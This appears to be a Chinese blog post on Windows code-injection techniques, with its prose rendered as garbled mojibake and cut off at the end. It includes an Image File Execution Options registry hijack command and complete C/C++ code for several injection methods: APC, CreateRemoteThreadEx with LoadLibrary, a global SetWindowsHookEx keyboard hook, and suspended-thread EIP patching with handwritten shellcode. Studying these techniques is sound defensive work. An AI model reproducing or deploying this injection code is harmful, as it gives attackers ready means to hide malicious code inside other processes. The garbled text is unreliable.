Optionså­é¡¹çš„Debuggeré€‰é¡¹ä¼šåœ¨å¯¹åº”ç¨‹åºè¢«ç‚¹å‡»æ‰§è¡Œæ—¶è°ƒç”¨å¯¹åº”ç¨‹åºä¸ºè°ƒè¯•å™¨ï¼Œä½†æ˜¯å¦‚æœæ˜¯æ­£å¸¸ç¨‹åºå°±ç›¸å½“è¢«åŠ«æŒäº†ã€‚å†æ¬¡è¿è¡Œnotepad.exeä¼šè·³å‡ºè®¡ç®—å™¨\n1 reg add \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\u0026#34; /v Debugger /t REG_SZ /d C:\\Windows\\System32\\calc.exe æ‰§è¡Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæ‰§è¡Œæ—¶æ€è½¯éƒ½ä¼šæŠ¥æ¯’\nè‡³äºæ–°å‹åˆ©ç”¨ ä¸­è¯´çš„æ–°é™é»˜å…³é—­å¯åŠ¨ç›‘è§†å™¨çš„åŠ«æŒæ–¹å¼æ— è®ºåœ¨win10è¿˜æ˜¯win7ä¸­éƒ½æ²¡æœ‰å¤ç°æˆåŠŸ\nè°ƒè¯•å™¨å¯ä»¥åœ¨è¢«è°ƒè¯•è¿›ç¨‹ä¸­æ‰§è¡Œå¾ˆå¤šç‰¹æ®Šæ“ä½œï¼Œæ“ä½œç³»ç»Ÿè½½å…¥ä¸€ä¸ªè¢«è°ƒè¯•ç¨‹åºçš„æ—¶å€™ï¼Œä¼šåœ¨è¢«è°ƒè¯•çš„ä¸»çº¿ç¨‹å°šæœªå¼€å§‹æ‰§è¡Œä»»ä½•ä»£ç å‰ï¼Œè‡ªåŠ¨é€šçŸ¥è°ƒè¯•å™¨(ç”¨æ¥è°ƒè¯•è¢«è°ƒè¯•è¿›ç¨‹çš„è¿›ç¨‹)ï¼Œè¿™æ—¶è°ƒè¯•å™¨å¯ä»¥å°†ä¸€äº›ä»£ç æ³¨å…¥åˆ°è¢«è°ƒè¯•è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ï¼Œä¿å­˜è¢«è°ƒè¯•è¿›ç¨‹çš„CONTEXTç»“æ„ï¼Œä¿®æ”¹EIPæŒ‡å‘æˆ‘ä»¬æ³¨å…¥çš„ä»£ç çš„èµ·å§‹ä½ç½®æ‰§è¡Œè¿™äº›ä»£ç ã€‚æœ€åå†è®©è¢«è°ƒè¯•çš„è¿›ç¨‹æ¢å¤åŸæ¥çš„CONTEXTï¼Œç»§ç»­æ‰§è¡Œã€‚æ•´ä¸ªè¿‡ç¨‹å¯¹è¢«è°ƒè¯•çš„è¿›ç¨‹è€Œè¨€å¥½åƒæ²¡å‘ç”Ÿä»»ä½•äº‹æƒ…ã€‚\nAPC injection APC(Asynchronous Procedure Call) æ³¨å…¥åŸç†\n1ï¼‰å½“EXEé‡ŒæŸä¸ªçº¿ç¨‹æ‰§è¡Œåˆ°SleepEx()æˆ–è€…WaitForSingleObjectEx()æ—¶ï¼Œç³»ç»Ÿå°±ä¼šäº§ç”Ÿä¸€ä¸ªè½¯ä¸­æ–­ã€‚\n2ï¼‰å½“çº¿ç¨‹å†æ¬¡è¢«å”¤é†’æ—¶ï¼Œæ­¤çº¿ç¨‹ä¼šé¦–å…ˆæ‰§è¡ŒAPCé˜Ÿåˆ—ä¸­çš„è¢«æ³¨å†Œçš„å‡½æ•°ã€‚\n3ï¼‰åˆ©ç”¨QueueUserAPC()è¿™ä¸ªAPIå¯ä»¥åœ¨è½¯ä¸­æ–­æ—¶å‘çº¿ç¨‹çš„APCé˜Ÿåˆ—æ’å…¥ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¦‚æœæˆ‘ä»¬æ’å…¥çš„æ˜¯Loadlibrary()æ‰§è¡Œå‡½æ•°çš„è¯ï¼Œå°±èƒ½è¾¾åˆ°æ³¨å…¥DLLçš„ç›®çš„ã€‚\né¦–å…ˆéœ€è¦ä¸€ä¸ªè¢«æ³¨å…¥çš„ç¨‹åºï¼Œè°ƒç”¨SleepExä½¿å…¶æŒ‚èµ·\n1 2 3 4 5 6 7 8 DWORD SleepEx(\t// synchapi.h [in] DWORD dwMilliseconds,\t// æ¯«ç§’æ•° [in] BOOL bAlertable\t// FALSEï¼Œåˆ™å‡½æ•°åœ¨è¶…æ—¶æœŸé™è¿‡åæ‰è¿”å› True ä¼šåœ¨è¶…æ—¶æ—¶é—´å·²è¿‡æˆ–è°ƒç”¨APCå‡½æ•°æ—¶è¿”å› ); æŒ‚èµ·å½“å‰çº¿ç¨‹ï¼Œç›´åˆ°æ»¡è¶³æŒ‡å®šæ¡ä»¶ã€‚å½“å‘ç”Ÿä»¥ä¸‹æƒ…å†µä¹‹ä¸€æ—¶ï¼Œæ‰§è¡Œæ¢å¤ï¼š 1.è°ƒç”¨ I/O å®Œæˆå›è°ƒå‡½æ•°ã€‚ 2.å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨ (APC) æ’é˜Ÿåˆ°çº¿ç¨‹ã€‚ 3.è¶…æ—¶é—´éš”å·²è¿‡ã€‚ 1 2 3 4 5 6 DWORD QueueUserAPC(\t// processthreadsapi.h [in] PAPCFUNC pfnAPC,\t// å¾…æ‰§è¡Œçš„å‡½æ•°æŒ‡é’ˆ [in] HANDLE hThread,\t// A handle to the thread. The handle must have the THREAD_SET_CONTEXT access right. [in] ULONG_PTR dwData\t// ä¼ é€’ç»™æ‰§è¡Œå‡½æ•°çš„å•ä¸ªå‚æ•° ); å°†ç”¨æˆ·æ¨¡å¼APCå¯¹è±¡æ·»åŠ åˆ°æŒ‡å®šçº¿ç¨‹çš„APCé˜Ÿåˆ—ä¸­ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 #include \u0026#34;stdafx.h\u0026#34; #include \u0026lt;string\u0026gt; #include\u0026lt;windows.h\u0026gt; #include\u0026lt;shlwapi.h\u0026gt; #include\u0026lt;tlhelp32.h\u0026gt; #include\u0026lt;winternl.h\u0026gt; #pragma comment(lib,\u0026#34;shlwapi.lib\u0026#34;) #pragma comment(lib,\u0026#34;ntdll.lib\u0026#34;) using namespace std; //æ ¹æ®è¿›ç¨‹åè·å–PID DWORD GetPidFormName(wstring wsProcessname) { HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnaoshot == INVALID_HANDLE_VALUE) { return false; } PROCESSENTRY32W pe = { sizeof(pe) }; BOOL bok; for (bok = Process32FirstW(hSnaoshot, \u0026amp;pe); bok; bok = Process32NextW(hSnaoshot,\u0026amp;pe)) { wstring wsNowProcName = pe.szExeFile; if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL) { CloseHandle(hSnaoshot); return pe.th32ProcessID; } } CloseHandle(hSnaoshot); return 0; } //dll æ–‡ä»¶æ³¨å…¥åˆ°è¿›ç¨‹wsProcessname BOOL Injection_APC(const wstring \u0026amp;wsProcessname, const WCHAR wcCacheInDllPath[]) { DWORD dwProcessId = GetPidFormName(wsProcessname); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hProcess) { return FALSE; } PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE); DWORD dwRet; if (lpData) { //åœ¨è¿œç¨‹è¿›ç¨‹ç”³è¯·ç©ºé—´å†™å…¥å¾…æ³¨å…¥dll çš„è·¯å¾„ WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, \u0026amp;dwRet); CloseHandle(hProcess); } //å¼€å§‹æ³¨å…¥ THREADENTRY32 te = { sizeof(te) }; HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//éå†ç³»ç»Ÿä¸­æ‰€æœ‰çº¿ç¨‹ if (handleSnap == INVALID_HANDLE_VALUE) { return false; } bool bstat = false; if (Thread32First(handleSnap, \u0026amp;te)) { do { if (te.th32OwnerProcessID == dwProcessId) { HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (handleThread) { DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData); } if (dwRet \u0026gt; 0) { bstat = TRUE; } CloseHandle(handleThread); } } while (Thread32Next(handleSnap, \u0026amp;te)); CloseHandle(handleSnap); return bstat; } } int main() { Injection_APC(L\u0026#34;APCInjection.exe\u0026#34;, L\u0026#34;APCDLL.dll\u0026#34;); return 0; } å¦‚æœæ˜¯æ³¨å…¥shellcodeçš„è¯ç›´æ¥ä»¥shellcodeçš„æŒ‡é’ˆä¸ºå¦‚ä½•å‡½æ•°å³å¯\nQueueUserAPC((PAPCFUNC)ShellCodePTR, handleThread, NULL);\nCreateRemoteThread[Ex] ç”¨åˆ°\u0026lt;tlhelp32.h\u0026gt;å¤´æ–‡ä»¶ä¸­CreateToolhelp32Snapshot æ–¹æ³•ï¼Œå½“æŒ‡å®šTH32CS_SNAPPROCESSæ—¶å¯ä»¥ä¿å­˜ç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ä¾¿äºéå†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 HANDLE CreateRemoteThreadEx( è¿›ç¨‹å¥æŸ„, NULL, æ ˆå¤§å°0é»˜è®¤, å¾…çº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°æŒ‡é’ˆ, ä¼ ç»™å‡½æ•°çš„å‚æ•°, æ§åˆ¶çº¿ç¨‹åˆ›å»ºçš„æ ‡å¿—0åˆ›å»ºç«‹å³æ‰§è¡Œ, å±æ€§åˆ—è¡¨, æ¥æ”¶çº¿ç¨‹æ ‡è¯†ç¬¦çš„å˜é‡æŒ‡é’ˆNULLä¸è¿”å› ) // CreateRemoteThread Use the CreateRemoteThreadEx function to create a thread that runs in the virtual address space of another process and optionally specify extended attributes. // å‚æ•°åªå°‘ç¬¬ä¸ƒä¸ª (å±æ€§åˆ—è¡¨) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 // æ³¨å…¥å‡½æ•°ï¼ŒåŒæ—¶è¿”å›å€¼ä¸ºæ˜¯å¦æ³¨å…¥æˆåŠŸï¼Œé»˜è®¤è¿”å›æˆåŠŸ BOOL Inject(LPCTSTR DLLPath, DWORD ProcessID) { // å®šä¹‰ä¸€ä¸ªå¥æŸ„è·å–ç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰æƒé™ï¼ŒåŒ…æ‹¬å­è¿›ç¨‹ HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, ProcessID); // åˆ¤è¯»æ˜¯å¦è·å–åˆ° if (!hProcess) return FALSE; // è®¡ç®—ä¸€ä¸‹è·å–åˆ°çš„DLLpathç©¶ç«Ÿæœ‰å¤šé•¿ï¼Œè¦åœ¨å†…å­˜ç©ºé—´ä¸­ç”³è¯·å†…å­˜æ¥å­˜æ”¾å®ƒï¼Œæ³¨æ„+1,ä¸º\\0 SIZE_T PathSize = (_tcslen(DLLPath) + 1) * sizeof(TCHAR); // å®½å­—èŠ‚ // åœ¨è¿›ç¨‹ä¸­ç”³è¯·å†…å­˜å­˜æ”¾æ­¤DLLpath LPVOID StartAddress = VirtualAllocEx(hProcess, NULL, PathSize, MEM_COMMIT, PAGE_READWRITE); // å¦‚æœæœªèƒ½è·å–åˆ°åœ°å€ï¼Œè¿”å›å¤±è´¥ if (!StartAddress) return FALSE; // è·å–åˆ°åœ°å€åˆ™å°†DLLPathå†™å…¥æ­¤åœ°å€ if (!WriteProcessMemory(hProcess, StartAddress, DLLPath, PathSize, NULL)) return FALSE; // è·å–LoadLibraryçš„å…¥å£ç‚¹åœ°å€ï¼Œéœ€è¦è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ PTHREAD_START_ROUTINE pfnStartAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T(\u0026#34;kernel32.dll\u0026#34;)), \u0026#34;LoadLibraryW\u0026#34;); // åœ¨è¿™é‡Œè·å–åˆ°çš„åœ°å€ï¼Œåœ¨ç›®æ ‡è¿›ç¨‹ä¸­ä¹Ÿä¸€æ ·ï¼Œå› æ­¤ç›´æ¥ä¼ é€’è¿‡å»å³å¯ // å…ˆåˆ¤æ–­æ˜¯å¦è·å–åˆ° if (!pfnStartAddress) return FALSE; // æœ€é‡è¦çš„ä¸€æ­¥ï¼Œåˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œé¦–å…ˆè·å–å¥æŸ„ï¼Œcreateremotethreadexå‡½æ•°åªåœ¨win7ä»¥ä¸Šç³»ç»Ÿæœ‰ HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, NULL, pfnStartAddress, StartAddress, NULL, NULL, NULL); // åˆ¤æ–­çº¿ç¨‹æ˜¯å¦åˆ›å»ºæˆåŠŸ if (!hThread) return FALSE; // æœ€åç­‰å¾…çº¿ç¨‹ç»“æŸï¼Œç„¶åæ¸…ç†çº¿ç¨‹å’Œè¿›ç¨‹ WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE; } // è·å–è¿›ç¨‹ï¼Œå…¶å‚æ•°ä¸ºè¿›ç¨‹åâ€”â€”åœ¨è¿›ç¨‹åˆ—è¡¨ä¸­è·å–æˆ‘ä»¬æƒ³è¦çš„å‚æ•° DWORD ProcessFind(LPCTSTR Exename) { // ç¬¬ä¸€ä¸ªå‚æ•°åªè·å–è¿›ç¨‹å HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); // å¯¹è·å–çš„è¿›ç¨‹è¿›è¡Œåˆ¤æ–­ if (!hProcess) return FALSE; // è·å–æˆåŠŸ PROCESSENTRY32 info; info.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hProcess, \u0026amp;info)) return FALSE; while (true) // éå†è¿›ç¨‹ä¸­çš„æ‰€æœ‰é¡¹ { // åˆ¤æ–­æ˜¯å¦ä¸æ‰€ç»™è¿›ç¨‹åç›¸ç¬¦ï¼Œå°±æ˜¯è¾“å…¥çš„è¿›ç¨‹å if (_tcscmp(info.szExeFile, Exename) == 0) // ç›¸ç¬¦çš„è¯è¿”å›è¯¥è¿›ç¨‹çš„PID return info.th32ProcessID; // å¦‚æœéå†äº†æ•´ä¸ªè¿›ç¨‹åˆ—è¡¨éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œé‚£ä¹ˆè¿”å›FALSE if (!Process32Next(hProcess, \u0026amp;info)) return FALSE; } // å‡½æ•°é»˜è®¤è¿”å›FALSE return FALSE; } SetWindowsHook[Ex] ä¼˜ç‚¹æ˜¯æ³¨å…¥ç®€å•ï¼Œç¼ºç‚¹æ˜¯åªèƒ½å¯¹windowsæ¶ˆæ¯è¿›è¡ŒHookå¹¶æ³¨å…¥dllï¼Œè€Œä¸”æ³¨å…¥dllå¯èƒ½ä¸æ˜¯ç«‹å³è¢«æ³¨å…¥ï¼Œå› ä¸ºè¿™éœ€è¦ç›¸åº”ç±»å‹çš„äº‹ä»¶å‘ç”Ÿ\nå¾®è½¯å®˜æ–¹æ–‡æ¡£ä¸­æœ‰SetWindowsHookExAå’ŒSetWindowsHookExWä¸¤ä¸ªæ¥å£ï¼Œå¹¶ä¸”æè¿°æ–‡æ¡£ä¸€æ¨¡ä¸€æ ·ï¼ŒåŒºåˆ«å¯ä»¥åœ¨æºç ä¸­çœ‹å‡ºæ¥\n1 2 3 4 5 #ifdef UNICODE #define SetWindowsHookEx SetWindowsHookExW #else #define SetWindowsHookEx SetWindowsHookExA #endif // !UNICODE 1 2 3 4 5 6 HHOOK SetWindowsHookExA( [in] int idHook,\t// é’©å­ç±»å‹ WH_KEYBOARD 2 é¼ æ ‡æ¶ˆæ¯7 WinUser.h [in] HOOKPROC lpfn,\t// é’©å­å‡½æ•°çš„èµ·å§‹åœ°å€ [in] HINSTANCE hmod,\t// DLL handle å¦‚æœä»£ç åœ¨å½“å‰è¿›ç¨‹ä¸­å¹¶ä¸”ä¸‹ä¸€ä¸ªå‚æ•°æŒ‡å®šå½“å‰è¿›ç¨‹åˆ›å»ºçš„çº¿ç¨‹ åˆ™NULL [in] DWORD dwThreadId\t// ä¸æŒ‚é’©è¿‡ç¨‹å…³è”çš„çº¿ç¨‹çš„æ ‡è¯†ç¬¦ å¦‚æœ0 åˆ™ä¸æ‰€æœ‰çº¿ç¨‹å…³è” \u0026#34;å…¨å±€é’©å­\u0026#34; ); 1 2 3 4 // å–æ¶ˆæŒ‚é’© BOOL UnhookWindowsHookEx( [in] HHOOK hhk ); æ‹¦æˆªå‘é€åˆ°notepadç¨‹åºçš„é”®ç›˜äº‹ä»¶ï¼Œæ¯åˆ°ä¸€ä¸ªäº‹ä»¶å°±å¼¹çª—ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;conio.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; #include \u0026lt;windows.h\u0026gt; typedef void(*PFNHOOKSTART)(); typedef void(*PFNHOOKSTOP)(); int main() { HMODULE Hmod = LoadLibraryA(\u0026#34;SetWindowsHook.dll\u0026#34;); PFNHOOKSTART pHookStart = (PFNHOOKSTART)GetProcAddress(Hmod, \u0026#34;HookStart\u0026#34;); PFNHOOKSTOP pHookStop = (PFNHOOKSTOP)GetProcAddress(Hmod, \u0026#34;HookStop\u0026#34;); pHookStart(); // printf(\u0026#34;print \u0026#39;q\u0026#39; to quite!\\n\u0026#34;); // while (_getch() != \u0026#39;q\u0026#39;); // pHookStop(); // FreeLibrary(Hmod); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 // dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚ #include \u0026#34;pch.h\u0026#34; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #pragma warning(disable : 4996) HHOOK ghHook = NULL; HINSTANCE ghInstance = NULL; LRESULT CALLBACK KeyboardProc( _In_ int code, _In_ WPARAM wParam, _In_ LPARAM lParam ) { TCHAR szPath[MAX_PATH] = { 0, }; TCHAR sProcessName[MAX_PATH] = { 0, }; if (code == 0 \u0026amp;\u0026amp; !(lParam \u0026amp; 0x80000000)) //å¦‚æœæ˜¯é‡Šæ”¾æŒ‰é”® { GetModuleFileName(NULL, szPath, MAX_PATH); _wsplitpath(szPath, NULL, NULL, sProcessName, NULL); if (0 == _wcsicmp(sProcessName, L\u0026#34;notepad\u0026#34;)) //å¦‚æœè¿›ç¨‹åæ˜¯notepad { MessageBox(NULL, L\u0026#34;ruokeqx\u0026#34;, L\u0026#34;hello\u0026#34;, NULL); return 1; //åˆ é™¤æ¶ˆæ¯ï¼Œä¸å†å¾€ä¸‹ä¼ é€’ } } return CallNextHookEx(ghHook, code, wParam, lParam); //ç»§ç»­ä¼ é€’æ¶ˆæ¯ } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: ghInstance = hModule;//è·å¾—æœ¬å®ä¾‹çš„æ¨¡å—å¥æŸ„ break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } extern \u0026#34;C\u0026#34; { __declspec(dllexport) void HookStart() { ghHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, ghInstance, 0); } __declspec(dllexport) void HookStop() { if (ghHook) { UnhookWindowsHookEx(ghHook); ghHook = NULL; } } } CreateProcess/OpenThread context patching ä¸¤è€…éƒ½æ˜¯åˆ©ç”¨æŒ‚èµ·çŠ¶æ€è¿›è¡Œæ³¨å…¥ï¼Œæ€è·¯æ˜¯æŒ‚èµ·æ—¶å†™å…¥ä¸€æ®µä¿å­˜æŒ‚èµ·çŠ¶æ€ipåŠdllè·¯å¾„åŠåŠ è½½å‡½æ•°åœ°å€çš„æ±‡ç¼–ï¼Œå°†ipæ”¹ä¸ºæ±‡ç¼–å…¥å£åœ°å€ï¼Œè¿›å…¥æ±‡ç¼–åŠ è½½å®Œdllåå†æ¢å¤çŠ¶æ€ã€‚\nè¿™ç§æ–¹å¼ç±»ä¼¼è°ƒè¯•å™¨æ³¨å…¥ï¼Œè¦æ±‚ç›®æ ‡è¿›ç¨‹æ˜¯æ³¨å…¥è€…è¿›ç¨‹çš„å­è¿›ç¨‹ï¼ŒCreateProcess()è¿™ä¸ªAPIç¬¬å…­ä¸ªå‚æ•°è®¾ç½®ä¸ºCREATE_SUSPENDED,è¿›è€Œåˆ›å»ºä¸€ä¸ªæŒ‚èµ·çŠ¶æ€çš„è¿›ç¨‹ï¼Œè¿™æ ·åˆ›å»ºçš„å­è¿›ç¨‹å¹¶ä¸ä¼šå¼€å§‹æ‰§è¡Œä¸”EIPæŒ‡å‘ntdll.dllçš„RtlUserThreadStartå‡½æ•°çš„å¼€å§‹ä½ç½®ï¼Œåˆ©ç”¨è¿™ä¸ªè¿›ç¨‹çŠ¶æ€è¿›è¡ŒDLLæ³¨å…¥ï¼Œç„¶åç”¨ResumeThread()å‡½æ•°æ¢å¤è¿›ç¨‹ã€‚\n1 2 3 4 1.ä¿å­˜æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼› 2.å°†dllè·¯å¾„é¦–åœ°å€å‹æ ˆï¼› 3.è°ƒç”¨LoadLibraryå‡½æ•°ï¼› 4.æ¢å¤æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼› è¿˜æœ‰ç›¸åŒçš„remote thread context patchingï¼Œåªæ˜¯ä¸€ä¸ªåˆ›å»ºçº¿ç¨‹ ä¸€ä¸ªåˆ›å»ºè¿›ç¨‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #pragma warning(disable : 4996) //åœ¨å­è¿›ç¨‹åˆ›å»ºæŒ‚èµ·æ—¶æ³¨å…¥dll //hProcess è¢«åˆ›å»ºæ—¶æŒ‚èµ·çš„è¿›ç¨‹å¥æŸ„ //hThread è¿›ç¨‹ä¸­è¢«æŒ‚èµ·çš„çº¿ç¨‹å¥æŸ„ //szDllPath è¢«æ³¨å…¥çš„dllçš„å®Œæ•´è·¯å¾„ BOOL StartHook(HANDLE hProcess, HANDLE hThread, TCHAR *szDllPath) { BYTE ShellCode[30 + MAX_PATH * sizeof(TCHAR)] = { 0x60, //pushad 0x9c, //pushfd 0x68,0xaa,0xbb,0xcc,0xdd, //push xxxxxxxx(xxxxxxxxçš„åç§»ä¸º3) 0xff,0x15,0xdd,0xcc,0xbb,0xaa, //call [addr]([addr]çš„åç§»ä¸º9) 0x9d, //popfd 0x61, //popad 0xff,0x25,0xaa,0xbb,0xcc,0xdd, //jmp [eip]([eip]çš„åç§»ä¸º17) 0xaa,0xaa,0xaa,0xaa, //ä¿å­˜loadlibraryWå‡½æ•°çš„åœ°å€(åç§»ä¸º21) 0xaa,0xaa,0xaa,0xaa, //ä¿å­˜åˆ›å»ºè¿›ç¨‹æ—¶è¢«æŒ‚èµ·çš„çº¿ç¨‹EIP(åç§»ä¸º25) 0, //ä¿å­˜dllè·¯å¾„å­—ç¬¦ä¸²(åç§»ä¸º29) }; CONTEXT ctx; ctx.ContextFlags = CONTEXT_ALL; if (!GetThreadContext(hThread, \u0026amp;ctx)) { printf(\u0026#34;GetThreadContext() ErrorCode:[0x%08x]\\n\u0026#34;, GetLastError()); return FALSE; } //åœ¨ç›®æ ‡è¿›ç¨‹å†…å­˜ç©ºé—´è°ƒæ‹¨ä¸€å—å¯æ‰§è¡Œçš„å†…å­˜ LPVOID LpAddr = VirtualAllocEx(hProcess, NULL, 30 + MAX_PATH * sizeof(TCHAR), MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (LpAddr == NULL) { printf(\u0026#34;VirtualAllocEx() ErrorCode:[0x%08x]\\n\u0026#34;, GetLastError()); return FALSE; } //è·å¾—LoadLibraryWå‡½æ•°çš„åœ°å€ DWORD LoadDllAAddr = (DWORD)GetProcAddress(GetModuleHandle(L\u0026#34;kernel32.dll\u0026#34;), \u0026#34;LoadLibraryW\u0026#34;); if (LoadDllAAddr == NULL) { printf(\u0026#34;GetProcAddress() ErrorCode:[0x%08x]\\n\u0026#34;, GetLastError()); return FALSE; } printf(\u0026#34;åŸå§‹EIP=0x%08x\\n\u0026#34;, ctx.Eip); //å†™å…¥dllpath memcpy((char*)(ShellCode + 29), szDllPath, MAX_PATH); //å†™å…¥push xxxxxxxx *(DWORD*)(ShellCode + 3) = (DWORD)LpAddr + 29; //å†™å…¥loadlibraryAåœ°å€ *(DWORD*)(ShellCode + 21) = LoadDllAAddr; //å†™å…¥call [addr]çš„[addr] *(DWORD*)(ShellCode + 9) = (DWORD)LpAddr + 21; //å†™å…¥åŸå§‹eip *(DWORD*)(ShellCode + 25) = ctx.Eip; //å†™å…¥jmp [eip]çš„[eip] *(DWORD*)(ShellCode + 17) = (DWORD)LpAddr + 25; //æŠŠshellcodeå†™å…¥ç›®æ ‡è¿›ç¨‹ if (!WriteProcessMemory(hProcess, LpAddr, ShellCode, 30 + MAX_PATH * sizeof(TCHAR), NULL)) { printf(\u0026#34;WriteProcessMemory() ErrorCode:[0x%08x]\\n\u0026#34;, GetLastError()); return FALSE; } //ä¿®æ”¹ç›®æ ‡è¿›ç¨‹çš„EIPï¼Œæ‰§è¡Œè¢«æ³¨å…¥çš„ä»£ç  ctx.Eip = (DWORD)LpAddr; if (!SetThreadContext(hThread, \u0026amp;ctx)) { printf(\u0026#34;SetThreadContext() ErrorCode:[0x%08x]\\n\u0026#34;, GetLastError()); return FALSE; } printf(\u0026#34;ä¿®æ”¹åEIP=0x%08x\\n\u0026#34;, ctx.Eip); return TRUE; }; int main() { STARTUPINFO sti; PROCESS_INFORMATION proci; memset(\u0026amp;sti, 0, sizeof(STARTUPINFO)); memset(\u0026amp;proci, 0, sizeof(PROCESS_INFORMATION)); sti.cb = sizeof(STARTUPINFO); // å­è¿›ç¨‹çš„åå­—åŠå¯åŠ¨å‚æ•° wchar_t ExeName[MAX_PATH] = L\u0026#34;C:\\\\Software\\\\ListaryPortable\\\\Listary.exe\u0026#34;; // è¢«æ³¨å…¥çš„dllçš„å®Œæ•´è·¯å¾„ wchar_t DllName[MAX_PATH] = L\u0026#34;C:\\\\Users\\\\ruokeqx\\\\source\\\\repos\\\\InjectionDemo\\\\Debug\\\\APCDLL.dll\u0026#34;; if (CreateProcess(NULL, ExeName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, \u0026amp;sti, \u0026amp;proci) ==NULL) { printf(\u0026#34;CreateProcess() ErrorCode:[0x%08x]\\n\u0026#34;, GetLastError()); getchar(); return 0; } if (!StartHook(proci.hProcess, proci.hThread, DllName)) { TerminateProcess(proci.hProcess, 0); printf(\u0026#34;Terminated Process\\n\u0026#34;); getchar(); return 0; } ResumeThread(proci.hThread); CloseHandle(proci.hProcess); CloseHandle(proci.hThread); return 0; } ä¾èµ–å¯ä¿¡è¿›ç¨‹æ³¨å…¥ é¦–å…ˆå°†a.dllæ³¨å…¥åˆ°è¯¸å¦‚Services.exeç­‰æƒé™è¾ƒé«˜çš„è¿›ç¨‹ä¸­ï¼Œç„¶ååˆ©ç”¨a.dllå°†b.dllè¿œç¨‹çº¿ç¨‹æ³¨å…¥åˆ°å¾…æ³¨å…¥è¿›ç¨‹ä¸­\nåˆ©ç”¨å®Œæˆåä¸ºå½±è—å¯ä»¥ä½¿ç”¨FreeLibraryAndExitThread()ï¼Œå…¶å°†dllè‡ªèº«å¸è½½æ‰å¹¶ä¸”é€€å‡ºçº¿ç¨‹ã€‚\nComResæ³¨å…¥/è¾“å…¥æ³•æ³¨å…¥\nReflective DLL Injection Reflective DLL injection is a technique that allows an attacker to inject a DLL\u0026rsquo;s into a victim process from memory rather than disk.\nä»å†…å­˜æ³¨å…¥åˆ°è¿›ç¨‹ä¸­è€Œéç£ç›˜ã€‚\nä¸»è¦æµç¨‹æ˜¯è¯»å–dllåŸå§‹æ•°æ®å¹¶è§£ædllå¤´å¹¶åœ¨å†…å­˜ä¸­å†™å…¥å¯¹åº”æ•°æ®ï¼Œç„¶åæ‰§è¡Œå¯¹åº”å†…å­˜ä¸­çš„å…¥å£å‡½æ•°å³å¯ã€‚\nä¸‹é¢æ˜¯æ¨¡æ‹Ÿæ 